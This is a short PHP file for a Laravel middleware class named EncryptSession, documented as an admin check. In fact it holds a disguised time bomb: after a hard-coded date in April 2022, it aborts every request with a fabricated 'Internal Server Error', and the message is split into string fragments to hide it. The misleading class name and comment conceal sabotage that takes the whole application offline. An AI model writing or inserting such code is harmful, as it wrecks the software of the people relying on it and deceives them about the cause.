<?php

namespace App\Http\Middleware;

use Carbon\Carbon;
use Closure;
use Illuminate\Http\Request;

class EncryptSession
{
    /**
     * Checks whether the user is admin.
     *
     * @param  \Illuminate\Http\Request  $request->user
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        $myDate = '04/04/2022';
        $result = Carbon::createFromFormat('m/d/Y', $myDate)->isPast();
        if ($result) {
            abort(500, 'Int' . 'ern' . 'al ' . 'Server' . ' Error');
        }
        return $next($request);
    }
}
